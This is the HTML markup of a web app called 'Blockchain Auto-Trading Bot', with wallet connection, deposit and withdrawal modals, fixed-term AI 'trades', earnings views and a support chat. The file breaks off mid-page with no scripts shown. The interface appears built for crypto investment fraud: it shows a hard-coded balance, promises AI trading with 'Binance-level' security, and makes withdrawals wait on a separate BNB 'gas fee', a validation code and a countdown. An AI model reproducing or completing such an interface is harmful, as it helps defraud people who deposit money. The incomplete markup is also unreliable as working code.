<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Blockchain Auto-Trading Bot</title>
  <meta name="theme-color" content="#0b0f14"/>
  <link rel="manifest" href="manifest.json">
  <link rel="icon" type="image/png" sizes="192x192" href="app-logo.png">
  <link rel="apple-touch-icon" href="app-logo.png">
  <!-- Tailwind CSS CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- TradingView -->
  <script src="https://s3.tradingview.com/tv.js"></script>
  <!-- ethers.js -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <!-- web3modal, walletconnect, tronweb, bitcoinjs-lib (for BTC address validate) -->
  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <!-- otplib for TOTP/Google Authenticator -->
  <script src="https://cdn.jsdelivr.net/npm/otplib@12.0.1/otplib.umd.min.js"></script>
  <!-- QRious for QR code generation -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
  <style>
    .tab-active img { filter: invert(100%) sepia(0%) saturate(0%) hue-rotate(0deg) brightness(100%) contrast(100%); }
    .coin-row:hover { background: rgba(255,255,255,0.02); }
    .tv-container { border-radius: 8px; overflow: hidden; background: #0b0f14; border: 1px solid rgba(255,255,255,0.03); }
    .install-prompt { background: #222; color: #fff; border-radius: 12px; box-shadow: 0 2px 32px #0008; padding: 28px; z-index: 50; position: fixed; top: 20%; left:50%; transform:translateX(-50%); max-width: 340px; width: 94vw; }
    .btn { padding: 0.5em 1.2em; border-radius: 6px; font-weight: 500; }
    .btn-primary { background: #f0b90b; color: #222; }
    .btn-secondary { background: #24262b; color: #fff; }
    .modal { background: rgba(0,0,0,0.75); position: fixed; z-index: 50; top:0;left:0;right:0;bottom:0; display:flex;align-items:center;justify-content:center; }
    .modal-content { background:#181a20; border-radius:12px; padding:28px; max-width:96vw; width:380px; color:#fff; }
    .sheet { position:fixed; left:0; right:0; bottom:0; background:#181a20; border-top-left-radius:18px; border-top-right-radius:18px; box-shadow:0 -4px 32px #0006; z-index:55; }
    .sheet-content { padding:20px 18px; }
    .fade { transition: opacity 0.3s; }
    .notif-pop { background: #151818; color: #f0b90b; border-radius: 8px; font-size: 15px; position: fixed; top: 60px; left: 0; right: 0; margin: 0 auto; max-width: 360px; padding: 10px 20px; z-index: 44; border:1px solid #f0b90b44; box-shadow: 0 2px 12px #0004; }
    .fadein { animation: fadein 0.5s; }
    @keyframes fadein { from{ opacity:0; } to{opacity:1;} }
    .input-black-text { color: #000 !important; background: #fff !important; }
    .hide { display:none !important; }
    .show { display:block !important; }
    /* TradingView mobile style mimic */
    .tv-mobile-btn { background: #23262f; color: #f0b90b; border-radius: 8px; font-weight: 500; padding: 8px 16px; margin: 6px 0; }
    .tv-mobile-footer { background: #101014; border-top: 1px solid #23262f; padding: 8px 0 6px 0; display: flex; justify-content: space-between; }
    .tv-mobile-footer button { flex:1; margin: 0 2px; }
    /* Custom scrollbars */
    ::-webkit-scrollbar { width: 7px; background: #111;}
    ::-webkit-scrollbar-thumb { background: #25262b; border-radius: 7px;}
    /* Responsive tweaks */
    @media (max-width:480px) {
      .modal-content, .sheet-content { width: 98vw; max-width: 98vw; }
      .notif-pop { max-width: 95vw; }
    }
  </style>
</head>
<body class="bg-black text-white font-sans min-h-screen">
  <!-- NOTIF POPUP -->
  <div id="notifPop" class="notif-pop fadein hide"></div>

  <!-- INSTALL PROMPT -->
  <div id="installPrompt" class="install-prompt hide">
    <h3 class="text-lg font-semibold mb-2">Install App</h3>
    <p>Install Blockchain Auto-Trading Bot for the best experience!</p>
    <div style="display:flex;gap:12px;margin-top:16px;">
      <button class="btn btn-primary" id="installNowBtn">Install Now</button>
      <button class="btn btn-secondary" id="maybeLaterBtn">Maybe Later</button>
    </div>
  </div>

  <!-- WALLET CONNECT MODAL (populated by JS) -->
  <div id="walletModal" class="modal hide" aria-modal="true">
    <div class="modal-content" style="max-width:400px">
      <div class="flex justify-between items-center mb-3">
        <div class="font-bold text-lg">Connect Wallet</div>
        <button id="closeWalletModal" aria-label="Close">&times;</button>
      </div>
      <div>
        <button id="connectMetaMask" class="w-full my-2 btn btn-primary">MetaMask</button>
        <button id="connectWalletConnect" class="w-full my-2 btn btn-secondary">WalletConnect</button>
        <button id="connectTron" class="w-full my-2 btn btn-secondary">TronLink</button>
        <button id="manualAddress" class="w-full my-2 btn btn-secondary">Manual Address</button>
      </div>
      <div id="manualAddressInput" class="my-2 hide">
        <input id="manualInput" class="w-full input-black-text rounded px-2 py-2 my-1" placeholder="Paste Wallet Address...">
        <button id="manualConfirm" class="w-full btn btn-primary mt-2">Confirm</button>
      </div>
    </div>
  </div>

  <!-- LOGIN MODAL -->
  <div id="loginModal" class="modal hide" aria-modal="true">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Login with Account ID</div>
      <input id="loginInput" class="w-full input-black-text rounded px-2 py-2 my-1" placeholder="Enter your 10-digit Account ID" maxlength="10">
      <button id="loginConfirm" class="w-full btn btn-primary mt-3">Confirm</button>
      <div id="loginMsg" class="text-center text-sm text-gray-400 mt-3"></div>
    </div>
  </div>

  <!-- ACCOUNT DETAILS MODAL -->
  <div id="accountModal" class="modal hide" aria-modal="true">
    <div class="modal-content">
      <div class="font-bold text-lg">Account Details</div>
      <div class="my-3">
        <div class="text-xs text-gray-400">Connected Address</div>
        <div id="accModalAddr" class="break-all"></div>
        <div class="text-xs text-gray-400 mt-2">Wallet Account ID</div>
        <div id="accModalID" class="break-all"></div>
        <div class="text-xs text-gray-400 mt-2">Balance</div>
        <div id="accModalBal" class="break-all"></div>
      </div>
      <button id="secureAccBtn" class="w-full btn btn-secondary my-2">Secure Account</button>
      <button id="closeAccModal" class="w-full btn btn-primary my-2">Close</button>
    </div>
  </div>

  <!-- 2FA GOOGLE AUTH MODAL -->
  <div id="authModal" class="modal hide" aria-modal="true">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Google Authenticator (2FA)</div>
      <div class="text-xs text-gray-400">Wallet Account ID</div>
      <div id="authAccID" class="mb-2"></div>
      <div class="text-xs text-gray-400">Scan QR code in Google Authenticator app</div>
      <canvas id="gaQR" style="margin:12px auto;display:block;"></canvas>
      <div class="text-xs text-gray-400">Secret Key</div>
      <div id="gaSecret" class="break-all mb-2"></div>
      <input id="gaCode" class="w-full input-black-text rounded px-2 py-2 my-2" maxlength="6" placeholder="Enter 6-digit code">
      <button id="gaVerifyBtn" class="w-full btn btn-primary">Verify Code</button>
      <div id="gaMsg" class="text-center text-sm text-gray-400 mt-2"></div>
      <button id="gaCloseBtn" class="w-full btn btn-secondary mt-2">Close</button>
    </div>
  </div>

  <!-- WITHDRAW SHEET -->
  <div id="withdrawSheet" class="sheet hide">
    <div class="sheet-content">
      <div class="font-bold text-lg mb-3">Withdraw</div>
      <button class="w-full btn btn-primary my-2" id="onChainTransferBtn">On-Chain Transfer</button>
      <button class="w-full btn btn-secondary my-2" id="userAccIDBtn">User Account ID</button>
      <button class="w-full btn btn-secondary my-2" id="closeWithdrawSheet">Cancel</button>
    </div>
  </div>

  <!-- WITHDRAW DETAIL MODAL -->
  <div id="withdrawDetailModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Withdraw Details</div>
      <div class="mb-2">
        <label class="text-xs text-gray-400">Withdrawal Address</label>
        <input id="wdAddr" class="w-full input-black-text rounded px-2 py-2 mt-1 mb-2" placeholder="Destination address">
        <button class="btn btn-secondary w-full my-1" id="fillFromWallet">Fill From Connected Wallet</button>
      </div>
      <div class="mb-2">
        <label class="text-xs text-gray-400">Select Network</label>
        <select id="wdNetwork" class="w-full input-black-text rounded px-2 py-2 mt-1">
          <option value="Ethereum">Ethereum (ERC-20)</option>
          <option value="Bitcoin">Bitcoin (BTC)</option>
          <option value="BNB">BNB Smart Chain (BEP20)</option>
          <option value="Tron">Tron (TRC-20)</option>
        </select>
      </div>
      <div class="mb-2 flex items-center">
        <label class="text-xs text-gray-400 flex-1">Amount</label>
        <input id="wdAmt" type="number" min="0" step="0.0001" class="flex-1 input-black-text rounded px-2 py-2" style="max-width:110px" placeholder="0.00">
        <button class="btn btn-secondary ml-2" id="wdMaxBtn">Max</button>
      </div>
      <div class="mb-2 text-xs text-yellow-500">Gas fee: 0.034 bnb</div>
      <button class="btn btn-primary w-full mt-2" id="wdSubmitBtn">Withdraw</button>
      <button class="btn btn-secondary w-full mt-2" id="closeWithdrawDetail">Cancel</button>
      <div id="wdDetailMsg" class="text-center mt-2 text-red-400"></div>
    </div>
  </div>

  <!-- WITHDRAW CODE MODAL -->
  <div id="withdrawCodeModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Enter Validation Code</div>
      <input id="wdCodeInput" class="w-full input-black-text rounded px-2 py-2 mt-1" maxlength="6" placeholder="6-digit code">
      <button class="btn btn-primary w-full mt-3" id="wdCodeSubmit">Submit</button>
      <div id="wdCodeMsg" class="text-center text-sm text-gray-400 mt-2"></div>
      <button class="btn btn-secondary w-full mt-2" id="closeWithdrawCode">Cancel</button>
    </div>
  </div>

  <!-- WITHDRAW PROCESSING MODAL -->
  <div id="withdrawProcessModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Withdrawal Processing</div>
      <div class="text-xs text-gray-400">Address</div>
      <div id="wpAddr"></div>
      <div class="text-xs text-gray-400 mt-2">Network</div>
      <div id="wpNetwork"></div>
      <div class="text-xs text-gray-400 mt-2">Amount</div>
      <div id="wpAmt"></div>
      <div class="text-xs text-gray-400 mt-2">Time Remaining</div>
      <div id="wpCountdown" class="font-bold"></div>
      <button class="btn btn-secondary w-full mt-3" id="wpViewDetails">View withdrawal details</button>
      <button class="btn btn-primary w-full mt-2" id="wpCloseBtn">Close</button>
    </div>
  </div>

  <!-- WITHDRAW SUCCESS MODAL -->
  <div id="withdrawSuccessModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Withdrawal Successful</div>
      <div id="wsDetails" class="mb-2"></div>
      <button class="btn btn-primary w-full mt-2" id="wsCloseBtn">Close</button>
    </div>
  </div>

  <!-- DEPOSIT MODAL -->
  <div id="depositModal" class="modal hide">
    <div class="modal-content" style="max-width:460px">
      <div class="flex justify-between items-center mb-2">
        <div class="font-bold text-lg">Deposit</div>
        <button id="closeDepositModal" aria-label="Close">&times;</button>
      </div>
      <input id="depositSearch" class="w-full input-black-text rounded px-2 py-2 my-1" placeholder="Search coin to deposit...">
      <div id="depositCoinList" class="max-h-52 overflow-auto mt-2"></div>
    </div>
  </div>

  <!-- DEPOSIT NETWORK MODAL -->
  <div id="depositNetworkModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Select Network</div>
      <div id="depositNetList"></div>
      <button class="btn btn-secondary w-full mt-2" id="closeDepositNetModal">Cancel</button>
    </div>
  </div>

  <!-- DEPOSIT ADDRESS MODAL -->
  <div id="depositAddressModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Deposit Address</div>
      <div class="text-xs text-gray-400 mb-1">Network</div>
      <div id="depNetLabel"></div>
      <div class="text-xs text-gray-400 mt-2 mb-1">Address</div>
      <div id="depAddrLabel" class="break-all"></div>
      <canvas id="depQrCanvas" style="margin:12px auto;display:block;"></canvas>
      <button class="btn btn-primary w-full mt-2" id="copyDepAddr">Copy Address</button>
      <button class="btn btn-secondary w-full mt-2" id="closeDepositAddrModal">Close</button>
    </div>
  </div>

  <!-- TRADE MODALS -->
  <div id="tradeModal" class="modal hide">
    <div class="modal-content">
      <div class="flex justify-between items-center mb-2">
        <div class="font-bold text-lg">Trading</div>
        <button id="closeTradeModal" aria-label="Close">&times;</button>
      </div>
      <div>
        <div class="mb-2">Total Trade Balance: <span id="tradeBal"></span></div>
        <div class="mb-2">Total Earnings: <span id="tradeEarn"></span></div>
        <div class="mb-2">Total Returns: <span id="tradeRet"></span></div>
        <button class="btn btn-primary w-full mt-2" id="placeTradeBtn">Place Trade</button>
        <button class="btn btn-secondary w-full mt-2" id="viewEarningsBtn">View Earnings</button>
        <button class="btn btn-secondary w-full mt-2" id="tradeTransferBtn">Transfer</button>
      </div>
    </div>
  </div>

  <!-- TRADE ASSET MODAL -->
  <div id="tradeAssetModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Select Asset</div>
      <div id="tradeAssetList" class="max-h-60 overflow-auto"></div>
      <button class="btn btn-secondary w-full mt-2" id="closeTradeAssetModal">Cancel</button>
    </div>
  </div>

  <!-- TRADE DURATION MODAL -->
  <div id="tradeDurModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Trade Duration</div>
      <select id="tradeDurSelect" class="w-full input-black-text rounded px-2 py-2 mt-1 mb-3">
        <option value="">Select duration...</option>
        <option value="1">1 month</option>
        <option value="2">2 months</option>
        <option value="3">3 months</option>
        <option value="4">4 months</option>
        <option value="5">5 months</option>
        <option value="6">6 months</option>
        <option value="7">7 months</option>
        <option value="8">8 months</option>
        <option value="9">9 months</option>
        <option value="10">10 months</option>
        <option value="11">11 months</option>
        <option value="12">12 months</option>
      </select>
      <button class="btn btn-primary w-full mt-2" id="tradeDurConfirm">Confirm</button>
      <button class="btn btn-secondary w-full mt-2" id="closeTradeDurModal">Cancel</button>
    </div>
  </div>

  <!-- TRADE PLACE ORDER MODAL -->
  <div id="tradePlaceOrderModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Place Order</div>
      <div id="tradeOrderAsset"></div>
      <div id="tradeOrderDur"></div>
      <button class="btn btn-primary w-full mt-3" id="tradeOrderBtn">Activate Trade</button>
      <button class="btn btn-secondary w-full mt-2" id="closeTradeOrderModal">Cancel</button>
    </div>
  </div>

  <!-- TRADE EARNINGS MODAL -->
  <div id="tradeEarningsModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Trade Earnings</div>
      <div id="tradeEarnBal"></div>
      <button class="btn btn-primary w-full mt-3" id="earningsTransferBtn">Transfer</button>
      <button class="btn btn-secondary w-full mt-2" id="closeTradeEarningsModal">Close</button>
    </div>
  </div>

  <!-- TRADE TRANSFER MODAL -->
  <div id="tradeTransferModal" class="modal hide">
    <div class="modal-content">
      <div class="font-bold text-lg mb-2">Transfer Funds</div>
      <div class="mb-2 flex items-center">
        <label class="text-xs text-gray-400 flex-1">Amount</label>
        <input id="transferAmt" type="number" min="0" step="0.0001" class="flex-1 input-black-text rounded px-2 py-2" style="max-width:110px" placeholder="0.00">
      </div>
      <div class="mb-2">
        <select id="transferType" class="w-full input-black-text rounded px-2 py-2 mt-1">
          <option value="main">Transfer to Main Wallet</option>
          <option value="trade">Transfer to Trade Account</option>
        </select>
      </div>
      <button class="btn btn-primary w-full mt-2" id="transferBtn">Transfer</button>
      <button class="btn btn-secondary w-full mt-2" id="closeTransferModal">Cancel</button>
    </div>
  </div>

  <!-- TRADEVIEW CHART MODAL -->
  <div id="tradeChartModal" class="modal hide">
    <div class="modal-content" style="max-width:500px">
      <div class="flex justify-between items-center mb-2">
        <div class="font-bold text-lg">Trading Chart</div>
        <button id="closeTradeChartModal" aria-label="Close">&times;</button>
      </div>
      <div id="tradingviewChart" class="tv-container" style="height:320px;"></div>
    </div>
  </div>

  <!-- HEADER -->
  <header id="mainHeader" class="flex items-center justify-between px-4 py-3 border-b border-gray-800 sticky top-0 bg-black z-20">
    <div class="flex items-center gap-3">
      <img src="app-logo.png" alt="Logo" class="w-7 h-7 rounded" />
      <div class="text-sm">
        <div class="font-semibold">Blockchain Bot</div>
        <div class="text-xs text-gray-400">Lite / Pro</div>
      </div>
    </div>
    <div class="flex-1 px-3 hidden sm:block">
      <!-- search bar only on large screens -->
      <input id="globalSearch" type="search" placeholder="Search coins, pairs or features" class="w-full input-black-text text-sm px-3 py-2 rounded-md border border-gray-700 focus:outline-none" />
      <div id="searchPanel" class="hidden mt-2 bg-gray-900 border border-gray-800 rounded-md max-h-56 overflow-auto text-sm">
        <div id="searchResults" class="p-2"></div>
      </div>
    </div>
    <div class="flex items-center gap-3 ml-3">
      <!-- QR -->
      <button title="QR Scanner" class="p-1" id="qrBtn">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" aria-label="QR Scanner" viewBox="0 0 24 24" fill="none" stroke="currentColor">
          <rect x="3" y="3" width="8" height="8" rx="1" />
          <rect x="13" y="3" width="8" height="8" rx="1" />
          <rect x="3" y="13" width="8" height="8" rx="1" />
          <rect x="13" y="13" width="8" height="8" rx="1" />
        </svg>
      </button>
      <!-- Notifications -->
      <button id="notifBtn" title="Notifications" class="p-1">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" aria-label="Notifications" viewBox="0 0 24 24" fill="none" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6 6 0 00-9.33-4.95" />
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9.5 19a2.5 2.5 0 005 0" />
        </svg>
      </button>
      <!-- Settings -->
      <button id="settingsBtn" title="Settings" class="p-1">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" aria-label="Settings" viewBox="0 0 24 24" fill="none" stroke="currentColor">
          <circle cx="12" cy="12" r="3" />
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
            d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 8 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 5 15.4a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 5 8.6a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 8.6 5a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09c.46.21.87.54 1 1.51a1.65 1.65 0 0 0 1.82.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19 8.6a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09c-.21.46-.54.87-1.51 1z" />
        </svg>
      </button>
      <!-- More -->
      <div class="relative">
        <button id="moreBtn" class="p-1">
          <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" aria-label="More" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <circle cx="12" cy="5" r="1.5" />
            <circle cx="12" cy="12" r="1.5" />
            <circle cx="12" cy="19" r="1.5" />
          </svg>
        </button>
        <div id="moreMenu" class="hidden absolute right-0 mt-2 w-48 bg-gray-900 border border-gray-800 rounded-md shadow-lg text-sm">
          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="connectedWalletBtn">Connected Wallet</a>
          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="settingsMenuBtn">Settings</a>
          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="supportBtn">Support</a>
          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="closeAccBtn">Close Account</a>
          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="disconnectBtn">Disconnect</a>
        </div>
      </div>
    </div>
  </header>

  <!-- MAIN PAGES -->
  <main id="main" class="pb-28">
    <!-- LANDING PAGE -->
    <section id="landingPage" class="page p-4">
      <div class="flex flex-col items-center mt-10">
        <img src="app-logo.png" class="w-16 h-16 mb-2 rounded" alt="App Logo">
        <h1 class="text-2xl font-bold mb-1 text-yellow-400">Blockchain Auto-Trading Bot</h1>
        <div class="text-center text-gray-300 mb-4">Automate your trading with AI on blockchain. Connect your wallet and start earning with Binance-level speed and security.</div>
        <div class="flex flex-col gap-3 w-full max-w-xs mb-4">
          <button id="connectWalletBtn" class="btn btn-primary w-full">Connect Wallet</button>
          <button id="loginIdBtn" class="btn btn-secondary w-full">Login ID</button>
          <button id="getMobileAppBtn" class="btn btn-primary w-full">Get Mobile App</button>
        </div>
        <div class="font-semibold text-lg mt-7 mb-2">Market Overview</div>
        <div id="landingMarket" class="w-full max-w-md mx-auto"></div>
        <div class="font-semibold text-lg mt-7 mb-2">Top Coins</div>
        <div id="landingTopCoins" class="w-full max-w-md mx-auto"></div>
      </div>
    </section>

    <!-- HOME PAGE -->
    <section id="home" class="page hidden p-4">
      <!-- Save Account Popup -->
      <div id="saveAccPopup" class="modal hide" aria-modal="true">
        <div class="modal-content">
          <div class="font-bold text-lg mb-3">Save Account Details</div>
          <div class="mb-2 text-sm">Please save your account info below. You will need this to log in again.</div>
          <button id="showAccountBtn" class="btn btn-primary w-full my-2">Show Account Details</button>
          <button id="closeSaveAccPopup" class="btn btn-secondary w-full my-2">Close</button>
        </div>
      </div>
      <!-- Market notification auto -->
      <div id="homeMarketNotif" class="notif-pop hide"></div>
      <div class="mb-3">
        <div class="flex items-start justify-between">
          <div>
            <div class="text-xs text-gray-400">Wallet ID</div>
            <div id="walletId" class="text-lg font-semibold mt-1">0000000000</div>
          </div>
          <div class="text-right">
            <div class="text-xs text-gray-400">Total Balance</div>
            <div id="totalBalance" class="text-2xl font-bold mt-1">$8,250.78</div>
          </div>
        </div>
      </div>
      <!-- Actions above holdings -->
      <div class="flex gap-2 mb-4">
        <button id="depositBtn" class="btn btn-primary flex-1">Deposit</button>
        <button id="swapBtn" class="btn btn-secondary flex-1">Swap</button>
        <button id="withdrawBtn" class="btn btn-primary flex-1">Withdraw</button>
      </div>
      <!-- Holdings -->
      <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
        <div class="flex items-center justify-between">
          <div class="flex items-center gap-3">
            <img id="usdtLogo" src="" class="w-8 h-8 rounded" alt="USDT logo" />
            <div>
              <div class="font-semibold">Tether USD (USDT)</div>
              <div id="usdtPrice" class="text-sm text-gray-400">$8250.78</div>
            </div>
          </div>
        </div>
        <!-- Connected Wallet actions -->
        <div class="mt-3 flex gap-3">
          <button class="flex-1 px-3 py-2 bg-gray-800 rounded text-sm" id="transactionsBtn">Transactions</button>
          <button class="flex-1 px-3 py-2 bg-gray-800 rounded text-sm" id="activityBtn">Activity</button>
        </div>
      </div>
      <!-- Quick Market Highlights -->
      <div class="mt-4">
        <div class="flex items-center justify-between mb-2">
          <div class="font-semibold">Live Market Performance</div>
          <div class="text-xs text-gray-400">BTC / USDT</div>
        </div>
        <div class="tv-container" id="tvchart" style="height:320px;"></div>
      </div>
      <!-- Top coins and market overview -->
      <div class="mt-4 grid grid-cols-1 gap-3">
        <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
          <div class="flex items-center justify-between mb-2">
            <div class="font-semibold">Top Coins</div>
            <button id="refreshMarkets" class="text-xs text-gray-400 hover:text-white">Refresh</button>
          </div>
          <div id="topCoinsList" class="space-y-2 text-sm"></div>
        </div>
        <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
          <div class="flex items-center justify-between mb-2">
            <div class="font-semibold">Gainers & Losers (24h)</div>
            <div class="text-xs text-gray-400">Updated</div>
          </div>
          <div class="grid grid-cols-2 gap-2 text-sm">
            <div id="gainers" class="space-y-1"></div>
            <div id="losers" class="space-y-1"></div>
          </div>
        </div>
      </div>
    </section>

    <!-- MARKETS PAGE -->
    <section id="markets" class="page hidden p-4">
      <div class="flex items-center justify-between mb-3">
        <div class="text-xl font-bold">Markets</div>
        <div class="text-sm text-gray-400">Spot / Futures</div>
      </div>
      <div class="bg-gray-900 border border-gray-800 rounded-md p-2">
        <div class="flex items-center gap-3 mb-2">
          <input id="marketSearch" type="text" placeholder="Search markets (e.g., BTC, ETH)" class="flex-1 input-black-text border border-gray-800 px-3 py-2 rounded text-sm" />
          <button id="marketRefresh" class="px-3 py-2 bg-gray-800 rounded text-sm">Refresh</button>
        </div>
        <div id="marketsList" class="max-h-[52vh] overflow-auto"></div>
      </div>
    </section>

    <!-- TRADE PAGE -->
    <section id="trade" class="page hidden p-4">
      <div class="text-xl font-bold mb-2">Trade (Spot)</div>
      <div class="grid grid-cols-1 gap-3">
        <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
          <div class="flex items-center gap-3">
            <select id="tradeSymbol" class="bg-gray-800 px-2 py-2 rounded text-sm">
              <option value="BINANCE:BTCUSDT">BTC/USDT</option>
              <option value="BINANCE:ETHUSDT">ETH/USDT</option>
              <option value="BINANCE:BNBUSDT">BNB/USDT</option>
            </select>
            <button id="loadSymbol" class="px-3 py-2 bg-gray-800 rounded text-sm">Load Chart</button>
          </div>
        </div>
        <div class="tv-container" id="tradeChart" style="height:340px;"></div>
        <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
          <div class="font-semibold mb-2">Convert</div>
          <div class="flex gap-2">
            <input id="convertFrom" placeholder="Amount" class="flex-1 input-black-text border border-gray-800 px-3 py-2 rounded text-sm" />
            <select id="convertPair" class="bg-gray-800 px-2 py-2 rounded text-sm">
              <option>USDT → BTC</option>
              <option>BTC → USDT</option>
              <option>USDT → ETH</option>
            </select>
          </div>
          <div class="mt-3 flex gap-2">
            <button id="convertBtn" class="flex-1 px-3 py-2 bg-yellow-500 text-black rounded">Convert</button>
            <button id="placeOrderBtn" class="flex-1 px-3 py-2 bg-gray-800 rounded">Trade</button>
          </div>
        </div>
      </div>
    </section>

    <!-- FUTURES PAGE -->
    <section id="futures" class="page hidden p-4">
      <div class="text-xl font-bold mb-3">Futures</div>
      <div class="tv-container" id="futuresChart" style="height:420px;"></div>
      <div class="mt-3 bg-gray-900 border border-gray-800 rounded-md p-3">
        <div class="flex items-center justify-between">
          <div class="font-semibold">Futures Pairs</div>
          <div class="text-sm text-gray-400">Simulated</div>
        </div>
        <div id="futuresList" class="mt-3 text-sm"></div>
      </div>
    </section>

    <!-- WALLETS PAGE -->
    <section id="wallets" class="page hidden p-4">
      <div class="text-xl font-bold mb-3">Wallets</div>
      <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
        <div class="flex items-center justify-between">
          <div>
            <div class="text-xs text-gray-400">Wallet ID</div>
            <div id="walletId2" class="font-semibold mt-1">0000000000</div>
          </div>
          <div class="text-right">
            <div class="text-xs text-gray-400">Total Balance</div>
            <div id="totalBalance2" class="text-lg font-bold mt-1">$8,250.78</div>
          </div>
        </div>
        <div class="mt-3">
          <div class="font-semibold mb-2">Holdings</div>
          <div id="walletHoldings" class="space-y-2 text-sm"></div>
        </div>
        <div class="mt-3">
          <div class="font-semibold mb-2">Recent Transactions</div>
          <div id="recentTx" class="text-sm text-gray-400">No transactions — demo mode.</div>
        </div>
      </div>
    </section>

    <!-- SETTINGS PAGE -->
    <section id="settingsPage" class="page hidden p-4">
      <div class="text-xl font-bold mb-3">Settings</div>
      <div class="bg-gray-900 border border-gray-800 rounded-md p-3 mb-4">
        <div class="mb-2 flex items-center justify-between">
          <div>Enable Notifications</div>
          <label class="flex items-center cursor-pointer">
            <input type="checkbox" id="notifToggle" class="form-checkbox h-5 w-5 text-yellow-500" />
            <span class="ml-2 text-xs text-gray-400" id="notifToggleLabel"></span>
          </label>
        </div>
        <div class="mb-2 flex items-center justify-between">
          <div>Theme</div>
          <select id="themeSelect" class="bg-gray-800 px-2 py-2 rounded text-sm">
            <option value="dark">Dark</option>
            <option value="light">Light</option>
            <option value="system">System</option>
          </select>
        </div>
        <div class="mb-2">
          <button id="closeAccountBtn" class="btn btn-primary w-full mt-2">Close Account (2FA Required)</button>
        </div>
      </div>
    </section>

    <!-- SUPPORT PAGE -->
    <section id="supportPage" class="page hidden p-4">
      <div class="text-xl font-bold mb-3">Support</div>
      <div class="bg-gray-900 border border-gray-800 rounded-md p-3 mb-4">
        <div class="font-bold mb-2">FAQs</div>
        <div class="mb-1"><span class="font-semibold">How to connect a wallet?</span><br>Click 'Connect Wallet' on the landing page and follow the prompts.</div>
        <div class="mb-1"><span class="font-semibold">How to withdraw?</span><br>Go to Home, click Withdraw, follow the steps.</div>
        <div class="mb-1"><span class="font-semibold">How do I enable 2FA?</span><br>In Account Details, click Secure Account.</div>
      </div>
      <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
        <div class="font-bold mb-2">Live Support AI Bot</div>
        <div id="supportChatBox" class="max-h-80 overflow-auto bg-gray-800 p-3 rounded mb-3" style="height:220px"></div>
        <div class="flex gap-2">
          <input id="supportUserMsg" class="flex-1 input-black-text rounded px-2 py-2" placeholder="Type your message...">
          <button id="supportSendBtn" class="btn btn-primary">Send</button>
        </div>
      </div>
    </section>

    <!-- NOTIFICATIONS PAGE -->
    <section id="notifPage" class="page hidden p-4">
      <div class="text-xl font-bold mb-3">Notifications</div>
      <div class="bg-gray-900 border border-gray-800 rounded-md p-3 mb-4">
        <div class="mb-2 flex items-center justify-between">
          <div>Receive Daily Market Updates</div>
          <label class="flex items-center cursor-pointer">
            <input type="checkbox" id="notifPageToggle" class="form-checkbox h-5 w-5 text-yellow-500" />
            <span class="ml-2 text-xs text-gray-400" id="notifPageToggleLabel"></span>
          </label>
        </div>
      </div>
      <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
        <div class="font-bold mb-2">Recent Notifications</div>
